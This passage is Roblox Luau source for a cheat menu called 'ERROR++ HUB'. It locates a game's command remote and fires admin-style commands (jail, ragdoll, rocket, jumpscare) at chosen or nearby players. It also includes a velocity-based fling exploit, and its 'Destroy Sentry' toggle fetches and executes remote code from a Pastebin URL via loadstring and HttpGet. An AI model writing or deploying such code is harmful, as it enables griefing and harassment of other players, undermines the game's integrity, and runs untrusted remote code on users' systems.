    return corner
end
local function addGlitchStroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color or GLITCH_THEME.BorderGlitch
    stroke.Thickness = thickness or 2
    stroke.Transparency = transparency or 0.5
    stroke.Parent = parent
    return stroke
end
local mainGui = Instance.new("ScreenGui")
mainGui.Name = "ErrorPlusPlusHub"
mainGui.Parent = playerGui
mainGui.ResetOnSpawn = false
mainGui.IgnoreGuiInset = true
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local function showGlitchNotification(text, color, duration)
    local notification = Instance.new("Frame")
    notification.Size = UDim2.new(0, 250, 0, 50)
    notification.Position = UDim2.new(0.5, -125, 0, -50)
    notification.BackgroundColor3 = GLITCH_THEME.PanelBg
    notification.Parent = mainGui
    addGlitchCorners(notification, 6)
    addGlitchStroke(notification, color or GLITCH_THEME.GlitchRed, 3, 0.4)
    local notifText = Instance.new("TextLabel")
    notifText.Size = UDim2.new(1, -15, 1, 0)
    notifText.Position = UDim2.new(0, 15, 0, 0)
    notifText.BackgroundTransparency = 1
    notifText.Text = text
    notifText.Font = Enum.Font.Arcade
    notifText.TextSize = 16
    notifText.TextColor3 = GLITCH_THEME.TextGlitch
    notifText.TextWrapped = true
    notifText.Parent = notification
    glitchTween(notification, {Position = UDim2.new(0.5, -125, 0, 20)}, 0.3, Enum.EasingStyle.Bounce)
    task.spawn(function()
        for i=1, math.random(3,6) do
            task.wait(0.1)
            glitchTween(notifText, {TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))}, 0.05)
        end
        task.wait(duration or 2.5)
        glitchTween(notification, {
            Position = UDim2.new(0.5, -125, 0, -50),
            BackgroundTransparency = 0.8
        }, 0.2)
        task.wait(0.2)
        notification:Destroy()
    end)
end
local commandCooldowns = {
    rocket = 120,
    ragdoll = 30,
    balloon = 30,
    inverse = 60,
    nightvision = 60,
    jail = 60,
    tiny = 60,
    jumpscare = 60,
    morph = 60
}
local lastCommandUse = {}
local commands = {"balloon","jumpscare","morph","inverse","nightvision","tiny"}
local function findRemote()
    for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
        local n = d.Name:lower()
        if n:find("executecommand") and (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) then
            return d
        end
    end
end
local remote = findRemote()
local proximityEnabled, playerCommandPools, lastHit = false, {}, {}
local selectedCommand, armedButton, globalCommandsLeft = nil, nil, #commands
local function isCommandOnCooldown(command)
    local lastUse = lastCommandUse[command]
    if not lastUse then return false end
    local cooldownTime = commandCooldowns[command] or 0
    return (tick() - lastUse) < cooldownTime
end
local function getRemainingCooldown(command)
    local lastUse = lastCommandUse[command]
    if not lastUse then return 0 end
    local cooldownTime = commandCooldowns[command] or 0
    local remaining = cooldownTime - (tick() - lastUse)
    return math.max(0, remaining)
end
local function executeCommand(player, command, source)
    if not remote then remote = findRemote() if not remote then return end end
  
    if isCommandOnCooldown(command) then
        local remaining = math.ceil(getRemainingCooldown(command))
        task.spawn(function()
            showGlitchNotification(command:upper() .. " COOLDOWN (" .. remaining .. "s)", GLITCH_THEME.GlitchYellow, 1.5)
        end)
        return
    end
  
    local ok = pcall(function() remote:FireServer(player, command) end)
    if ok then
        lastCommandUse[command] = tick()
        if source=="proximity" and globalCommandsLeft>0 then
            globalCommandsLeft -= 1
            if globalCommandsLeft < 0 then globalCommandsLeft=0 end
            if _G.__cmdCounter then
                _G.__cmdCounter.Text = "CMDS LEFT: "..tostring(globalCommandsLeft)
            end
        end
        task.spawn(function()
            showGlitchNotification("EXEC: " .. command .. " ON " .. player.DisplayName, GLITCH_THEME.GlitchGreen, 1.5)
        end)
      
        if source == "manual" then
            local cooldownTime = commandCooldowns[command] or 0
            if cooldownTime > 0 then
                task.spawn(function()
                    task.wait(cooldownTime)
                    local pool = playerCommandPools[player]
                    if pool and not table.find(pool, command) then
                        table.insert(pool, command)
                        for i = #pool, 2, -1 do
                            local j = math.random(i)
                            pool[i], pool[j] = pool[j], pool[i]
                        end
                    end
                end)
            end
        end
    end
end
local glitchProximityPanel = Instance.new("Frame")
glitchProximityPanel.Name = "Proximity"
glitchProximityPanel.Size = UDim2.new(0, 300, 0, 400)
glitchProximityPanel.Position = UDim2.new(0, 50, 0.5, -200)
glitchProximityPanel.BackgroundColor3 = GLITCH_THEME.GlitchBg
glitchProximityPanel.BackgroundTransparency = 0.2
glitchProximityPanel.Parent = mainGui
addGlitchCorners(glitchProximityPanel, 5)
addGlitchStroke(glitchProximityPanel, GLITCH_THEME.GlitchRed, 3, 0.6)
-- Glitch Header
local glitchHeader = Instance.new("Frame")
glitchHeader.Size = UDim2.new(1, 0, 0, 40)
glitchHeader.BackgroundTransparency = 1
glitchHeader.Parent = glitchProximityPanel
local glitchTitle = Instance.new("TextLabel")
glitchTitle.Size = UDim2.new(1, -40, 1, 0)
glitchTitle.Position = UDim2.new(0, 20, 0, 0)
glitchTitle.BackgroundTransparency = 1
glitchTitle.Text = "ERROR++ HUB ZONE"
glitchTitle.Font = Enum.Font.Arcade
glitchTitle.TextSize = 18
glitchTitle.TextColor3 = GLITCH_THEME.GlitchCyan
glitchTitle.TextXAlignment = Enum.TextXAlignment.Left
glitchTitle.TextYAlignment = Enum.TextYAlignment.Center
glitchTitle.Parent = glitchHeader
task.spawn(function()
    while glitchTitle.Parent do
        glitchTween(glitchTitle, {TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))}, 0.1)
        task.wait(0.2 + math.random())
    end
end)
-- Commands counter
local cmdCounterFrame = Instance.new("Frame")
cmdCounterFrame.Size = UDim2.new(1, -40, 0, 25)
cmdCounterFrame.Position = UDim2.new(0, 20, 0, 50)
cmdCounterFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
cmdCounterFrame.Parent = glitchProximityPanel
addGlitchCorners(cmdCounterFrame, 4)
local cmdCounterText = Instance.new("TextLabel")
_G.__cmdCounter = cmdCounterText
cmdCounterText.Size = UDim2.new(1, -15, 1, 0)
cmdCounterText.Position = UDim2.new(0, 15, 0, 0)
cmdCounterText.BackgroundTransparency = 1
cmdCounterText.Text = "CMDS LEFT: " .. tostring(globalCommandsLeft)
cmdCounterText.Font = Enum.Font.Arcade
cmdCounterText.TextSize = 14
cmdCounterText.TextColor3 = GLITCH_THEME.TextShadow
cmdCounterText.TextXAlignment = Enum.TextXAlignment.Left
cmdCounterText.TextYAlignment = Enum.TextYAlignment.Center
cmdCounterText.Parent = cmdCounterFrame
-- Proximity toggle
local proximityFrame = Instance.new("Frame")
proximityFrame.Size = UDim2.new(1, -40, 0, 40)
proximityFrame.Position = UDim2.new(0, 20, 0, 85)
proximityFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
proximityFrame.Parent = glitchProximityPanel
addGlitchCorners(proximityFrame, 4)
local proximityLabel = Instance.new("TextLabel")
proximityLabel.Size = UDim2.new(1, 0, 0, 15)
proximityLabel.Position = UDim2.new(0, 15, 0, 5)
proximityLabel.BackgroundTransparency = 1
proximityLabel.Text = "PROXIMITY"
proximityLabel.Font = Enum.Font.Arcade
proximityLabel.TextSize = 14
proximityLabel.TextColor3 = GLITCH_THEME.TextGlitch
proximityLabel.TextXAlignment = Enum.TextXAlignment.Left
proximityLabel.TextYAlignment = Enum.TextYAlignment.Center
proximityLabel.Parent = proximityFrame
local proximityStatus = Instance.new("TextLabel")
proximityStatus.Size = UDim2.new(1, -15, 0, 12)
proximityStatus.Position = UDim2.new(0, 15, 0, 25)
proximityStatus.BackgroundTransparency = 1
proximityStatus.Text = ""
proximityStatus.Font = Enum.Font.Arcade
proximityStatus.TextSize = 11
proximityStatus.TextColor3 = GLITCH_THEME.TextError
proximityStatus.TextXAlignment = Enum.TextXAlignment.Left
proximityStatus.TextYAlignment = Enum.TextYAlignment.Center
proximityStatus.Parent = proximityFrame
local proximityToggle = Instance.new("TextButton")
proximityToggle.Size = UDim2.new(0, 90, 0, 25)
proximityToggle.Position = UDim2.new(1, -100, 0.5, -12)
proximityToggle.BackgroundColor3 = GLITCH_THEME.GlitchRed
proximityToggle.Text = "OFFLINE"
proximityToggle.Font = Enum.Font.Arcade
proximityToggle.TextSize = 12
proximityToggle.TextColor3 = GLITCH_THEME.TextGlitch
proximityToggle.AutoButtonColor = false
proximityToggle.Parent = proximityFrame
addGlitchCorners(proximityToggle, 5)
local touchFlingFrame = Instance.new("Frame")
touchFlingFrame.Size = UDim2.new(1, -40, 0, 40)
touchFlingFrame.Position = UDim2.new(0, 20, 0, 135)
touchFlingFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
touchFlingFrame.Parent = glitchProximityPanel
addGlitchCorners(touchFlingFrame, 4)
local touchFlingLabel = Instance.new("TextLabel")
touchFlingLabel.Size = UDim2.new(1, 0, 0, 15)
touchFlingLabel.Position = UDim2.new(0, 15, 0, 5)
touchFlingLabel.BackgroundTransparency = 1
touchFlingLabel.Text = "FLING"
touchFlingLabel.Font = Enum.Font.Arcade
touchFlingLabel.TextSize = 14
touchFlingLabel.TextColor3 = GLITCH_THEME.TextGlitch
touchFlingLabel.TextXAlignment = Enum.TextXAlignment.Left
touchFlingLabel.TextYAlignment = Enum.TextYAlignment.Center
touchFlingLabel.Parent = touchFlingFrame
local touchFlingToggle = Instance.new("TextButton")
touchFlingToggle.Size = UDim2.new(0, 90, 0, 25)
touchFlingToggle.Position = UDim2.new(1, -100, 0.5, -12)
touchFlingToggle.BackgroundColor3 = GLITCH_THEME.GlitchRed
touchFlingToggle.Text = "INACTIVE"
touchFlingToggle.Font = Enum.Font.Arcade
touchFlingToggle.TextSize = 12
touchFlingToggle.TextColor3 = GLITCH_THEME.TextGlitch
touchFlingToggle.AutoButtonColor = false
touchFlingToggle.Parent = touchFlingFrame
addGlitchCorners(touchFlingToggle, 5)
local autoTurretFrame = Instance.new("Frame")
autoTurretFrame.Size = UDim2.new(1, -40, 0, 40)
autoTurretFrame.Position = UDim2.new(0, 20, 0, 185)
autoTurretFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
autoTurretFrame.Parent = glitchProximityPanel
addGlitchCorners(autoTurretFrame, 4)
local autoTurretLabel = Instance.new("TextLabel")
autoTurretLabel.Size = UDim2.new(1, 0, 0, 15)
autoTurretLabel.Position = UDim2.new(0, 15, 0, 5)
autoTurretLabel.BackgroundTransparency = 1
autoTurretLabel.Text = "DESTROY SENTRY"
autoTurretLabel.Font = Enum.Font.Arcade
autoTurretLabel.TextSize = 14
autoTurretLabel.TextColor3 = GLITCH_THEME.TextGlitch
autoTurretLabel.TextXAlignment = Enum.TextXAlignment.Left
autoTurretLabel.TextYAlignment = Enum.TextYAlignment.Center
autoTurretLabel.Parent = autoTurretFrame
local autoTurretToggle = Instance.new("TextButton")
autoTurretToggle.Size = UDim2.new(0, 90, 0, 25)
autoTurretToggle.Position = UDim2.new(1, -100, 0.5, -12)
autoTurretToggle.BackgroundColor3 = GLITCH_THEME.GlitchRed
autoTurretToggle.Text = "INACTIVE"
autoTurretToggle.Font = Enum.Font.Arcade
autoTurretToggle.TextSize = 12
autoTurretToggle.TextColor3 = GLITCH_THEME.TextGlitch
autoTurretToggle.AutoButtonColor = false
autoTurretToggle.Parent = autoTurretFrame
addGlitchCorners(autoTurretToggle, 5)
if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
    local detection = Instance.new("Decal")
    detection.Name = "juisdfj0i32i0eidsuf0iok"
    detection.Parent = ReplicatedStorage
end
local hiddenfling = false
local flingThread
local function fling()
    local lp = Players.LocalPlayer
    local c, hrp, vel, movel = nil, nil, nil, 0.1
    while hiddenfling do
        RunService.Heartbeat:Wait()
        c = lp.Character
        hrp = c and c:FindFirstChild("HumanoidRootPart")
        if hrp then
            vel = hrp.Velocity
            hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
            RunService.RenderStepped:Wait()
            hrp.Velocity = vel
            RunService.Stepped:Wait()
            hrp.Velocity = vel + Vector3.new(0, movel, 0)
            movel = -movel
        end
    end
end
touchFlingToggle.MouseButton1Click:Connect(function()
    hiddenfling = not hiddenfling
    touchFlingToggle.Text = hiddenfling and "ACTIVE" or "INACTIVE"
    touchFlingToggle.BackgroundColor3 = hiddenfling and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    if hiddenfling then
        flingThread = coroutine.create(fling)
        coroutine.resume(flingThread)
        task.spawn(function()
            showGlitchNotification("FLING ACTIVATED!", GLITCH_THEME.GlitchGreen, 1.5)
        end)
    else
        hiddenfling = false
        task.spawn(function()
            showGlitchNotification("FLING DEACTIVATED!", GLITCH_THEME.GlitchRed, 1.5)
        end)
    end
end)
touchFlingToggle.MouseEnter:Connect(function()
    local currentColor = hiddenfling and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(touchFlingToggle, {BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(0,100), math.random(0,100))}, 0.1)
end)
touchFlingToggle.MouseLeave:Connect(function()
    local currentColor = hiddenfling and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(touchFlingToggle, {BackgroundColor3 = currentColor}, 0.1)
end)
local autoTurretEnabled = false
local autoTurretLoaded = false
autoTurretToggle.MouseButton1Click:Connect(function()
    autoTurretEnabled = not autoTurretEnabled
    autoTurretToggle.Text = autoTurretEnabled and "ACTIVE" or "INACTIVE"
    autoTurretToggle.BackgroundColor3 = autoTurretEnabled and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    if autoTurretEnabled and not autoTurretLoaded then
        task.spawn(function()
            showGlitchNotification("LOADING DESTROY SENTRY...", GLITCH_THEME.GlitchBlue, 1.5)
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://pastebin.com/raw/gdhvBAR8"))()
            end)
          
            if success then
                autoTurretLoaded = true
                showGlitchNotification("DESTROY SENTRY ACTIVE!", GLITCH_THEME.GlitchGreen, 1.5)
            else
                autoTurretEnabled = false
                autoTurretToggle.Text = "INACTIVE"
                autoTurretToggle.BackgroundColor3 = GLITCH_THEME.GlitchRed
                showGlitchNotification("TURRET LOAD ERROR: " .. tostring(err), GLITCH_THEME.GlitchRed, 2)
            end
        end)
    elseif autoTurretEnabled then
        task.spawn(function()
            showGlitchNotification("SENTRY ALREADY DESTROYED!", GLITCH_THEME.GlitchGreen, 1.5)
        end)
    else
        task.spawn(function()
            showGlitchNotification("DESTROY SENTRY INACTIVE!", GLITCH_THEME.GlitchRed, 1.5)
        end)
    end
end)
autoTurretToggle.MouseEnter:Connect(function()
    local currentColor = autoTurretEnabled and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(autoTurretToggle, {BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(0,100), math.random(0,100))}, 0.1)
end)
autoTurretToggle.MouseLeave:Connect(function()
    local currentColor = autoTurretEnabled and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(autoTurretToggle, {BackgroundColor3 = currentColor}, 0.1)
end)
local keybindFrame = Instance.new("Frame")
keybindFrame.Size = UDim2.new(1, -40, 0, 25)
keybindFrame.Position = UDim2.new(0, 20, 0, 235)
keybindFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
keybindFrame.Parent = glitchProximityPanel
addGlitchCorners(keybindFrame, 4)
local keybindText = Instance.new("TextLabel")
keybindText.Size = UDim2.new(1, -15, 1, 0)
keybindText.Position = UDim2.new(0, 15, 0, 0)
keybindText.BackgroundTransparency = 1
keybindText.Text = "TOGGLE KEY: Z"
keybindText.Font = Enum.Font.Arcade
keybindText.TextSize = 14
keybindText.TextColor3 = GLITCH_THEME.TextError
keybindText.TextXAlignment = Enum.TextXAlignment.Left
keybindText.TextYAlignment = Enum.TextYAlignment.Center
keybindText.Parent = keybindFrame
local rangeFrame = Instance.new("Frame")
rangeFrame.Size = UDim2.new(1, -40, 0, 45)
rangeFrame.Position = UDim2.new(0, 20, 0, 270)
rangeFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
rangeFrame.Parent = glitchProximityPanel
addGlitchCorners(rangeFrame, 4)
local rangeText = Instance.new("TextLabel")
rangeText.Size = UDim2.new(1, -15, 0, 15)
rangeText.Position = UDim2.new(0, 15, 0, 5)
rangeText.BackgroundTransparency = 1
rangeText.Text = "RANGE: 50 UNITS"
rangeText.Font = Enum.Font.Arcade
rangeText.TextSize = 14
rangeText.TextColor3 = GLITCH_THEME.TextError
rangeText.TextXAlignment = Enum.TextXAlignment.Left
rangeText.TextYAlignment = Enum.TextYAlignment.Center
rangeText.Parent = rangeFrame
local sliderTrack = Instance.new("Frame")
sliderTrack.Size = UDim2.new(1, -15, 0, 6)
sliderTrack.Position = UDim2.new(0, 15, 0, 25)
sliderTrack.BackgroundColor3 = GLITCH_THEME.BorderGlitch
sliderTrack.Parent = rangeFrame
addGlitchCorners(sliderTrack, 3)
local sliderFill = Instance.new("Frame")
sliderFill.Size = UDim2.new(0.4, 0, 1, 0)
sliderFill.BackgroundColor3 = GLITCH_THEME.GlitchPurple
sliderFill.Parent = sliderTrack
addGlitchCorners(sliderFill, 3)
local sliderHandle = Instance.new("TextButton")
sliderHandle.Size = UDim2.new(0, 20, 0, 20)
sliderHandle.Position = UDim2.new(0.4, -10, 0.5, -10)
sliderHandle.BackgroundColor3 = GLITCH_THEME.GlitchPurple
sliderHandle.Text = ""
sliderHandle.AutoButtonColor = false
sliderHandle.Parent = sliderTrack
addGlitchCorners(sliderHandle, 10)
local proximityRange = 50
local draggingSlider = false
local function updateSlider(mouseX)
    local trackPos = sliderTrack.AbsolutePosition.X
    local trackSize = sliderTrack.AbsoluteSize.X
    local relativeX = math.clamp((mouseX - trackPos) / trackSize, 0, 1)
  
    proximityRange = math.floor(10 + (relativeX * 190))
    rangeText.Text = "RANGE: " .. proximityRange .. " UNITS"
  
    sliderFill.Size = UDim2.new(relativeX, 0, 1, 0)
    sliderHandle.Position = UDim2.new(relativeX, -10, 0.5, -10)
end
sliderHandle.MouseButton1Down:Connect(function()
    draggingSlider = true
end)
UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then
        updateSlider(input.Position.X)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSlider = false
    end
end)
local statusFrame = Instance.new("Frame")
statusFrame.Size = UDim2.new(1, -40, 0, 30)
statusFrame.Position = UDim2.new(0, 20, 0, 325)
statusFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
statusFrame.Parent = glitchProximityPanel
addGlitchCorners(statusFrame, 4)
local statusIndicator = Instance.new("Frame")
statusIndicator.Size = UDim2.new(0, 15, 0, 15)
statusIndicator.Position = UDim2.new(0, 15, 0.5, -7)
statusIndicator.BackgroundColor3 = GLITCH_THEME.GlitchRed
statusIndicator.Parent = statusFrame
addGlitchCorners(statusIndicator, 7)
local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, -40, 1, 0)
statusText.Position = UDim2.new(0, 35, 0, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "SYSTEM ERROR"
statusText.Font = Enum.Font.Arcade
statusText.TextSize = 14
statusText.TextColor3 = GLITCH_THEME.TextShadow
statusText.TextXAlignment = Enum.TextXAlignment.Left
statusText.TextYAlignment = Enum.TextYAlignment.Center
statusText.Parent = statusFrame
local glitchErrorPanel = Instance.new("Frame")
glitchErrorPanel.Name = "GlitchErrors"
glitchErrorPanel.Size = UDim2.new(0, 300, 0, 300)
glitchErrorPanel.Position = UDim2.new(1, -350, 0.5, -150)
glitchErrorPanel.BackgroundColor3 = GLITCH_THEME.GlitchBg
glitchErrorPanel.BackgroundTransparency = 0.2
glitchErrorPanel.Parent = mainGui
addGlitchCorners(glitchErrorPanel, 5)
addGlitchStroke(glitchErrorPanel, GLITCH_THEME.GlitchBlue, 3, 0.6)
local errorHeader = Instance.new("Frame")
errorHeader.Size = UDim2.new(1, 0, 0, 40)
errorHeader.BackgroundTransparency = 1
errorHeader.Parent = glitchErrorPanel
local errorTitle = Instance.new("TextLabel")
errorTitle.Size = UDim2.new(1, -40, 1, 0)
errorTitle.Position = UDim2.new(0, 20, 0, 0)
errorTitle.BackgroundTransparency = 1
errorTitle.Text = "ERROR++ CONTROL"
errorTitle.Font = Enum.Font.Arcade
errorTitle.TextSize = 18
errorTitle.TextColor3 = GLITCH_THEME.GlitchYellow
errorTitle.TextXAlignment = Enum.TextXAlignment.Left
errorTitle.TextYAlignment = Enum.TextYAlignment.Center
errorTitle.Parent = errorHeader
task.spawn(function()
    while errorTitle.Parent do
        glitchTween(errorTitle, {TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))}, 0.1)
        task.wait(0.2 + math.random())
    end
end)
local commandCenterInfo = Instance.new("TextLabel")
commandCenterInfo.Size = UDim2.new(1, -40, 0, 25)
commandCenterInfo.Position = UDim2.new(0, 20, 0, 50)
commandCenterInfo.BackgroundTransparency = 1
commandCenterInfo.Text = "SELECT TARGET FOR SPAM"
commandCenterInfo.Font = Enum.Font.Arcade
commandCenterInfo.TextSize = 13
commandCenterInfo.TextColor3 = GLITCH_THEME.TextShadow
commandCenterInfo.TextXAlignment = Enum.TextXAlignment.Center
commandCenterInfo.TextYAlignment = Enum.TextYAlignment.Center
commandCenterInfo.Parent = glitchErrorPanel
local playerListFrame = Instance.new("ScrollingFrame")
playerListFrame.Size = UDim2.new(1, -40, 1, -85)
playerListFrame.Position = UDim2.new(0, 20, 0, 85)
playerListFrame.BackgroundTransparency = 1
playerListFrame.BorderSizePixel = 0
playerListFrame.ScrollBarThickness = 5
playerListFrame.ScrollBarImageColor3 = GLITCH_THEME.GlitchPurple
playerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
playerListFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
playerListFrame.Parent = glitchErrorPanel
local playerListLayout = Instance.new("UIListLayout")
playerListLayout.SortOrder = Enum.SortOrder.Name
playerListLayout.Padding = UDim.new(0, 6)
playerListLayout.Parent = playerListFrame
local glitchCooldownPanel = Instance.new("Frame")
glitchCooldownPanel.Name = "GlitchCooldowns"
glitchCooldownPanel.Size = UDim2.new(0, 250, 0, 180)
glitchCooldownPanel.Position = UDim2.new(1, -270, 1, -200)
glitchCooldownPanel.BackgroundColor3 = GLITCH_THEME.GlitchBg
glitchCooldownPanel.BackgroundTransparency = 0.2
glitchCooldownPanel.Parent = mainGui
addGlitchCorners(glitchCooldownPanel, 5)
addGlitchStroke(glitchCooldownPanel, GLITCH_THEME.GlitchCyan, 3, 0.6)
local cooldownHeader = Instance.new("TextLabel")
cooldownHeader.Size = UDim2.new(1, -15, 0, 25)
cooldownHeader.Position = UDim2.new(0, 15, 0, 10)
cooldownHeader.BackgroundTransparency = 1
cooldownHeader.Text = "COOLDOWNS"
cooldownHeader.Font = Enum.Font.Arcade
cooldownHeader.TextSize = 15
cooldownHeader.TextColor3 = GLITCH_THEME.GlitchPurple
cooldownHeader.TextXAlignment = Enum.TextXAlignment.Left
cooldownHeader.TextYAlignment = Enum.TextYAlignment.Center
cooldownHeader.Parent = glitchCooldownPanel
local cooldownLabels = {}
local cooldownCommandsList = {
    {name = "ROCKET", cmd = "rocket", color = GLITCH_THEME.GlitchYellow},
    {name = "RAGDOLL", cmd = "ragdoll", color = GLITCH_THEME.GlitchBlue},
    {name = "BALLOON", cmd = "balloon", color = GLITCH_THEME.GlitchGreen},
    {name = "INVERSE", cmd = "inverse", color = GLITCH_THEME.GlitchCyan},
    {name = "JAIL", cmd = "jail", color = GLITCH_THEME.GlitchRed},
    {name = "NIGHTVISION", cmd = "nightvision", color = GLITCH_THEME.GlitchPurple},
    {name = "TINY", cmd = "tiny", color = GLITCH_THEME.GlitchGreen},
    {name = "MORPH", cmd = "morph", color = GLITCH_THEME.GlitchBlue}
}
for i, cmd in ipairs(cooldownCommandsList) do
    local cooldownItem = Instance.new("Frame")
    cooldownItem.Size = UDim2.new(1, -15, 0, 15)
    cooldownItem.Position = UDim2.new(0, 15, 0, 35 + (i-1) * 16)
    cooldownItem.BackgroundTransparency = 1
    cooldownItem.Parent = glitchCooldownPanel
  
    local cmdNameLabel = Instance.new("TextLabel")
    cmdNameLabel.Size = UDim2.new(0.55, 0, 1, 0)
    cmdNameLabel.BackgroundTransparency = 1
    cmdNameLabel.Text = cmd.name .. ":"
    cmdNameLabel.Font = Enum.Font.Arcade
    cmdNameLabel.TextSize = 12
    cmdNameLabel.TextColor3 = GLITCH_THEME.TextShadow
    cmdNameLabel.TextXAlignment = Enum.TextXAlignment.Left
    cmdNameLabel.TextYAlignment = Enum.TextYAlignment.Center
    cmdNameLabel.Parent = cooldownItem
  
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.45, 0, 1, 0)
    statusLabel.Position = UDim2.new(0.55, 0, 0, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "READY"
    statusLabel.Font = Enum.Font.Arcade
    statusLabel.TextSize = 12
    statusLabel.TextColor3 = GLITCH_THEME.GlitchGreen
    statusLabel.TextXAlignment = Enum.TextXAlignment.Right
    statusLabel.TextYAlignment = Enum.TextYAlignment.Center
    statusLabel.Parent = cooldownItem
  
    cooldownLabels[cmd.cmd] = statusLabel
end
local function resetPlayerPool(plr)
    playerCommandPools[plr] = table.clone(commands)
    for i = #playerCommandPools[plr], 2, -1 do
        local j = math.random(i)
        playerCommandPools[plr][i], playerCommandPools[plr][j] = playerCommandPools[plr][j], playerCommandPools[plr][i]
    end
end
local function createPlayerButton(player)
    local playerFrame = Instance.new("Frame")
    playerFrame.Name = "Target_" .. player.Name
    playerFrame.Size = UDim2.new(1, 0, 0, 30)
    playerFrame.BackgroundColor3 = GLITCH_THEME.PanelBg
    playerFrame.Parent = playerListFrame
    addGlitchCorners(playerFrame, 3)
  
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(0.5, -15, 1, 0)
    nameLabel.Position = UDim2.new(0, 15, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = player.DisplayName .. " @" .. player.Name
    nameLabel.Font = Enum.Font.Arcade
    nameLabel.TextSize = 11
    nameLabel.TextColor3 = GLITCH_THEME.TextGlitch
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.TextYAlignment = Enum.TextYAlignment.Center
    nameLabel.TextWrapped = true
    nameLabel.Parent = playerFrame
  
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(0.5, -15, 1, -5)
    buttonContainer.Position = UDim2.new(0.5, 0, 0, 2)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = playerFrame
  
    local buttonLayout = Instance.new("UIListLayout")
    buttonLayout.FillDirection = Enum.FillDirection.Horizontal
    buttonLayout.SortOrder = Enum.SortOrder.LayoutOrder
    buttonLayout.Padding = UDim.new(0, 4)
    buttonLayout.Parent = buttonContainer
  
    local buttons = {
        {text = "LOCK", color = GLITCH_THEME.GlitchRed, command = "jail", size = UDim2.new(0, 40, 0, 23)},
        {text = "RAG", color = GLITCH_THEME.GlitchBlue, command = "ragdoll", size = UDim2.new(0, 35, 0, 23)},
        {text = "EXPLODE", color = GLITCH_THEME.GlitchYellow, command = "rocket", size = UDim2.new(0, 50, 0, 23)},
        {text = "FULL GLITCH", color = GLITCH_THEME.GlitchPurple, command = "all", size = UDim2.new(0, 60, 0, 23)}
    }
  
    for _, btn in ipairs(buttons) do
        local button = Instance.new("TextButton")
        button.Size = btn.size
        button.BackgroundColor3 = btn.color
        button.Text = btn.text
        button.Font = Enum.Font.Arcade
        button.TextSize = 9
        button.TextColor3 = GLITCH_THEME.TextGlitch
        button.AutoButtonColor = false
        button.Parent = buttonContainer
        addGlitchCorners(button, 3)
      
        button.MouseButton1Click:Connect(function()
            if btn.command == "all" then
                for cmdName, _ in pairs(commandCooldowns) do
                    if not isCommandOnCooldown(cmdName) then
                        executeCommand(player, cmdName, "manual")
                        local pool = playerCommandPools[player]
                        if pool then
                            for i = #pool, 1, -1 do
                                if pool[i] == cmdName then
                                    table.remove(pool, i)
                                    break
                                end
                            end
                        end
                        task.wait(0.08)
                    end
                end
            elseif not isCommandOnCooldown(btn.command) then
                executeCommand(player, btn.command, "manual")
                local pool = playerCommandPools[player]
                if pool then
                    for i = #pool, 1, -1 do
                        if pool[i] == btn.command then
                            table.remove(pool, i)
                            break
                        end
                    end
                end
                glitchTween(button, {BackgroundTransparency = 0.6}, 0.08)
                task.wait(0.08)
                glitchTween(button, {BackgroundTransparency = 0}, 0.08)
            else
                local remaining = math.ceil(getRemainingCooldown(btn.command))
                task.spawn(function()
                    showGlitchNotification(btn.command:upper() .. " COOLDOWN (" .. remaining .. "s)", GLITCH_THEME.GlitchYellow, 1.5)
                end)
            end
        end)
      
        button.MouseEnter:Connect(function()
            if btn.command == "all" or not isCommandOnCooldown(btn.command) then
                glitchTween(button, {BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(100,255), math.random(100,255))}, 0.1)
            end
        end)
      
        button.MouseLeave:Connect(function()
            glitchTween(button, {BackgroundColor3 = btn.color}, 0.1)
        end)
      
        if btn.command ~= "all" then
            task.spawn(function()
                while button.Parent do
                    if isCommandOnCooldown(btn.command) then
                        button.BackgroundTransparency = 0.7
                        button.TextTransparency = 0.6
                    else
                        button.BackgroundTransparency = 0
                        button.TextTransparency = 0
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
  
    playerFrame.MouseEnter:Connect(function()
        glitchTween(playerFrame, {BackgroundColor3 = Color3.fromRGB(math.random(10,30), math.random(10,30), math.random(10,30))}, 0.1)
    end)
  
